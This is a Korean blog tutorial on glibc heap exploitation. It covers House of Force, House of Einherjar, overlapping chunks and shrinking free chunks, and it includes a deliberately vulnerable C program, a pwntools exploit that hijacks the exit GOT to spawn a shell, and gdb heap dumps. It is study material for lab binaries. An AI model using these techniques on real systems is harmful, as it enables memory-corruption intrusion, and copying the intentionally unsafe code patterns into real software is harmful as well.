---
title: 각종 size를 이용한 공격 방법
date: 2019-01-29
---

# House Of Force

생각보다 간단한 공격이다.

top chunk의 size를 0xffffffffffffffff(최대치)로 overwrite 하고 malloc시 임의의 size로 할당한다면 top chunk의 위치를 바꿔 원하는 영역에 chunk를 할당받을 수 있는 공격이다. 

size는 target address - 0x10 - &top chunk 

```c
#include <stdio.h>              
#include <stdlib.h>             
#include <unistd.h>             
                                
void win() {                    
        execve("/bin/sh",0,0);  
}                               
                                
int main() {                    
        setvbuf(stdin,0,2,0);   
        setvbuf(stdout,0,2,0);  
        char * a,* a1,* a2;     
        long b;                 
        a = malloc(0x20);       
        printf("heap : %p\n",a);
        gets(a);                
        printf("size : \n");    
        scanf("%ld",&b);        
        getchar();              
        a1 = malloc(b);         
        a2 = malloc(0x20);      
        printf("Go!\n");        
        gets(a2);               
        exit(1);                
}                               
```

간단한 예제 코드고

```python
from pwn import *                             
                                              
t = process('./hf')                           
                                              
t.recvuntil("heap : ")                        
top = int(t.recvline(),16) + 0x20             
success(hex(top))                             
t.sendline("a"*0x28 + p64(0xffffffffffffffff))
t.recvuntil("size : ")                        
t.sendline(str(0x601060 - 0x20 - top))        
t.recvuntil("Go!")                            
pause()                                       
t.sendline(p64(0x0000000000400806)*2)         
pause()                                       
t.interactive()                               
```

간단한 익스코드다

```c
gdb-peda$ x/32gx 0x1a00000
0x1a00000:      0x0000000000000000      0x0000000000000031
0x1a00010:      0x6161616161616161      0x6161616161616161
0x1a00020:      0x6161616161616161      0x6161616161616161
0x1a00030:      0x6161616161616161      0xffffffffffffffff
```

먼저 이렇게 top chunk의 size를 최대한으로 overwrite한다. 이렇게 바꾸게되면 아무리 큰size로 할당하더라도 sysmalloc이나 mmap이 호출되지 않는다.

```c
   0x4008c9 <main+168>: call   0x4006a0 <getchar@plt>
   0x4008ce <main+173>: mov    rax,QWORD PTR [rbp-0x28]
   0x4008d2 <main+177>: mov    rdi,rax
=> 0x4008d5 <main+180>: call   0x4006c0 <malloc@plt>
   0x4008da <main+185>: mov    QWORD PTR [rbp-0x18],rax
   0x4008de <main+189>: mov    edi,0x20
   0x4008e3 <main+194>: call   0x4006c0 <malloc@plt>
   0x4008e8 <main+199>: mov    QWORD PTR [rbp-0x10],rax
Guessed arguments:
arg[0]: 0xfffffffffe0ff010
```

계산한 size로 malloc

```c
gdb-peda$ ar
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x601050 (size : 0x1f00fd8) (top is broken ?)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
```

top chunk 가 target address로 들어갔다.

```c
gdb-peda$ x/32gx 0x601080 - 0x30
0x601050:       0x00007f18b7d52e70      0x0000000000000031
0x601060:       0x00000000004006f6      0x0000000000000000
0x601070:       0x0000000000000000      0x0000000000000000
```

다시 malloc을 하게 되면 top chunk 위치였던 곳에 chunk가 할당된다.

```c
gdb-peda$ x/32gx 0x601080 - 0x30
0x601050:       0x00007f18b7d52e70      0x0000000000000031
0x601060:       0x0000000000400806      0x0000000000400806
```

exit got에 win 함수를 넣어주고나면 끝!

```c
$ id
uid=1000(bskim)
```



# House Of Einherjar

이름부터 맘에들지 않는다.

fake chunk와 off-by-one을 통한 prev_inuse flag overwrite 및 prev_size overwrite 를 이용해 fake free chunk를 top chunk에 넣어버리기!! 하는 공격..(병합을 이용한다)

how2heap의 예제코드를 사용하겠당

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x603000            0x0                 0x40                 Used                None              None

0x7fffffffe400:	0x0000000000000100	0x0000000000000100
0x7fffffffe410:	0x00007fffffffe400	0x00007fffffffe400
0x7fffffffe420:	0x00007fffffffe400	0x00007fffffffe400
```

malloc 하나 할당하고 stack에 fake chunk를 만들어준다. fd 와 bk를 설정해준 건 unlink의 조건을 맞추기 위함이다.

fake chunk의 prev_inuse flag는 설정 해제 시킨 상태

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x603000            0x0                 0x40                 Used                None              None
0x603040            0x0                 0x100                Used                None              None
```

f8만큼 하나 더 할당

```c
gdb-peda$ x/32gx 0x603040
0x603040:	0x0000000000000000	0x0000000000000100
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
```

그리고 off-by-one같은 취약점을 이용해 2번 째 chunk의 prev_inuse flag 설정을 해제 함

```c
gdb-peda$ x/32gx 0x603040
0x603040:	0xffff800000604c40	0x0000000000000100
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
```

그리고 2번 째 chunk의 prev_size를 변!조! 한다. 

```c
gdb-peda$ p 0x603040 - 0x00007fffffffe400
$1 = 0xffff800000604c40
```

변조한 chunk -  fake chunk 로 계산 때리면 된다.

```c
0x7fffffffe400:	0x0000000000000100	0xffff800000604c40
0x7fffffffe410:	0x00007fffffffe400	0x00007fffffffe400
0x7fffffffe420:	0x00007fffffffe400	0x00007fffffffe400
```

맞춰서 fake chunk의 size도 변경해준다.

```c
gdb-peda$ ar
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x7fffffffe400 (size : 0xffff800000625c00) (top is broken ?)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
```

그리고 변조한 chunk를 free 해주면 top chunk에 target address가 들어간다.

```c
0x7fffffffe400:	0x0000000000000100	0xffff800000625c01
0x7fffffffe410:	0x00007fffffffe400	0x00007fffffffe400
0x7fffffffe420:	0x00007fffffffe400	0x00007fffffffe400
```

그거에 맞게 fake chunk size도 바뀐 모습

```c
0x7fffffffe400:	0x0000000000000100	0x0000000000000211
0x7fffffffe410:	0x00007fffffffe400	0x00007fffffffe400
0x7fffffffe420:	0x00007fffffffe400	0x00007fffffffe400

gdb-peda$ ar
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x7fffffffe610 (size : 0xffff8000006259f0) (top is broken ?)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
```

그리고 다시 malloc을 하면 stack에 할당되게 된다.



# Overlapping chunk

overlapping chunk

off-by-one을 이용한 prev_inuse flag를 덮음으로써 발생시킨다. 

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x603000            0x0                 0x100                Used                None              None
0x603100            0x0                 0x100                Used                None              None
0x603200            0x0                 0x80                 Used                None              None
```

먼저 3개의 malloc 할당

```c
gdb-peda$ x/32gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000101
0x603010:	0x3131313131313131	0x3131313131313131
0x603020:	0x3131313131313131	0x3131313131313131
0x603030:	0x3131313131313131	0x3131313131313131
0x603040:	0x3131313131313131	0x3131313131313131
0x603050:	0x3131313131313131	0x3131313131313131
0x603060:	0x3131313131313131	0x3131313131313131
0x603070:	0x3131313131313131	0x3131313131313131
0x603080:	0x3131313131313131	0x3131313131313131
0x603090:	0x3131313131313131	0x3131313131313131
0x6030a0:	0x3131313131313131	0x3131313131313131
0x6030b0:	0x3131313131313131	0x3131313131313131
0x6030c0:	0x3131313131313131	0x3131313131313131
0x6030d0:	0x3131313131313131	0x3131313131313131
0x6030e0:	0x3131313131313131	0x3131313131313131
0x6030f0:	0x3131313131313131	0x3131313131313131
gdb-peda$
0x603100:	0x3131313131313131	0x0000000000000101
0x603110:	0x3232323232323232	0x3232323232323232
0x603120:	0x3232323232323232	0x3232323232323232
0x603130:	0x3232323232323232	0x3232323232323232
0x603140:	0x3232323232323232	0x3232323232323232
0x603150:	0x3232323232323232	0x3232323232323232
0x603160:	0x3232323232323232	0x3232323232323232
0x603170:	0x3232323232323232	0x3232323232323232
0x603180:	0x3232323232323232	0x3232323232323232
0x603190:	0x3232323232323232	0x3232323232323232
0x6031a0:	0x3232323232323232	0x3232323232323232
0x6031b0:	0x3232323232323232	0x3232323232323232
0x6031c0:	0x3232323232323232	0x3232323232323232
0x6031d0:	0x3232323232323232	0x3232323232323232
0x6031e0:	0x3232323232323232	0x3232323232323232
0x6031f0:	0x3232323232323232	0x3232323232323232
gdb-peda$
0x603200:	0x3232323232323232	0x0000000000000081
0x603210:	0x3333333333333333	0x3333333333333333
0x603220:	0x3333333333333333	0x3333333333333333
0x603230:	0x3333333333333333	0x3333333333333333
0x603240:	0x3333333333333333	0x3333333333333333
0x603250:	0x3333333333333333	0x3333333333333333
0x603260:	0x3333333333333333	0x3333333333333333
0x603270:	0x3333333333333333	0x3333333333333333
0x603280:	0x3333333333333333	0x0000000000020d81
 
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x603000            0x0                 0x100                Used                None              None
0x603100            0x3131313131313131  0x100                Freed     0x7ffff7dd1b78    0x7ffff7dd1b78
0x603200            0x100               0x80                 Used                None              None
```

청크 순 대로 번호매김 시켜주고 2 chunk Free

```c
gdb-peda$
0x603100:	0x3131313131313131	0x0000000000000181
0x603110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
```

그 다음 free 시킨 chunk의 size를 변조

```c
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x603280 (size : 0x20d80)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
```

2 chunk가 언솔빈에 들어있는 상태에서 사이즈에 맞게 malloc을 해준다. 일단 4 chunk가 할당되었고

2 chunk 0x603100 ~ 0x6031f8

3 chunk 0x603200 ~ 0x603288

4 chunk 0x603100 ~ 0x603288 

이렇게 4 chunk 안에 2,3 chunk가 오버랩 되게 된다.

```c
p4 = xk�;w
p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�

If we memset(p4, '4', 376), we have:
p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�
p3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�

And if we then memset(p3, '3', 80), we have:
p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�
p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�
```

이렇게 p4 에 4를 넣으면 p3도 4를 가지게되고 아래 p3에 3을 넣었을 때 p4 중간에 3이 들어가게 됨

변경된 size가 top chunk를 가리키기 때문에 malloc()함수가 unlink를 호출시키지 않는다. 그래서 prev_size 검증을 우회할 수 있음



# Overlapping chunk 2

2번 째 overlap 시킬 수 있는 상황은 더 많은 것 같음

이건 간단하게 말로..

5개 정도의 영역을 할당(fast chunk) 하고 4번 째 chunk를 free 하고 2번 째 chunk의 size를 2 + 3 chunk size + prev_inuse 까지 해서 변조 해주고 2번 째 chunk를 free 하면 3번 째 chunk는 무시되고 2 + 3 chunk가 합쳐진 큰 덩어리로 병합이 되어버린다. 그리고 그만큼 다시 할당해주면 3 chunk를 overlap 시킬 수 있음 (fast chunk는 병합 시키지 않기 때문에 free해도 prev_size랑 prev_inuse flag가 변하지 않음)

small bin 이상으로 쓰려면 prev_size만 설정해주면 가능



# Shrinking Free Chunks

poisen null byte를 이용.. 사실 이게 맞는지 모르겠다 현 우분투 16.04 이상으로는 Forgotten Chunk가 잘 통하지 않는다고 한다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main() {
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);

	long * a, * b, * c, * b1, * b2, * overlap, * d;
	
	a = malloc(0x80);
	b = malloc(0x200);
	c = malloc(0x80);

	d = b-1;

	free(b);
	
	printf("Del to prev_inuse\n");
	*d = 0x200;

	d = c - 4;
	*d = 0x200;	

	b1 = malloc(0x80);
	b2 = malloc(0x80);

	strcpy(b2,"b2's data!");
	
	printf("%s\n",b2);
	
	free(b1);
	free(c);

	overlap = malloc(0x200);
	memset(overlap,'a',0x1ff);

	printf("%s\n",b2);
}
```

예제코드

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x602000            0x0                 0x90                 Used                None              None
0x602090            0x0                 0x210                Used                None              None
0x6022a0            0x0                 0x90                 Used                None              None
```

3개의 말록 할당

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x602000            0x0                 0x90                 Freed                0x0               0x0
0x602090            0x0                 0x200                Freed     0x7ffff7dd1b78    0x7ffff7dd1b78
Corrupt ?! (size == 0) (0x602290)

gdb-peda$ x/32gx 0x602090
0x602090:	0x0000000000000000	0x0000000000000200
0x6020a0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
    
0x602290:	0x0000000000000200	0x0000000000000000
```

b chunk free 해주고 size를 0x211 -> 0x200 으로 off-by-one 그리고 glibc 2.23 이상부터는 size 와 next chunk의 prev_size 검증이 있기 때문에 (unlink) size에 맞게 prev_size도 적어주어야 한다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x602000            0x0                 0x90                 Used                None              None
0x602090            0x0                 0x90                 Used                None              None
0x602120            0x0                 0x90                 Used                None              None
0x6021b0            0x0                 0xe0                 Freed     0x7ffff7dd1b78    0x7ffff7dd1b78
```

그리고 b chunk에 b1, b2 chunk를 할당해보자(fast chunk가 아닌 b 보다 작은 size로) 여기서 실제 c chunk의 prev_size는 업데이트되지 않는다.

```c
gdb-peda$ x/s 0x602130
0x602130:	"b2's data!"
```

b2 에는 이런 데이터를 넣어주고

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x602000            0x0                 0x90                 Used                None              None
0x602090            0x0                 0x90                 Freed           0x6021b0    0x7ffff7dd1b78
0x602120            0x90                0x90                 Used                None              None
0x6021b0            0x0                 0xe0                 Freed     0x7ffff7dd1b78          0x602090

gdb-peda$ par
addr                prev                size                 status              fd                bk
0x602000            0x0                 0x90                 Used                None              None
gdb-peda$ ar
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x602090 (size : 0x20f70)
       last_remainder: 0x6021b0 (size : 0xe0)
            unsortbin: 0x6021b0 (size : 0xe0)
```

b1 free -> c free

이렇게 되면 top chunk가 b chunk로 들어가게된다. c 의 prev_size가 업데이트 되지 않았기 때문에 그대로 0x210만큼 계산해 병합해 버린 것 이 때 b2 chunk는 남아있게 됨

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x602000            0x0                 0x90                 Used                None              None
0x602090            0x0                 0x210                Used                None              None
```

그다음 다시 b chunk만큼 할당한 overlap chunk에 임의의 문자열을 집어넣으면 b2 chunk의 data가 덮이게 된다.

```c
bskim@bsbuntu:~/2019$ ./shrinking_free_chunks
Del to prev_inuse
b2 : b2's data!
b2 : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```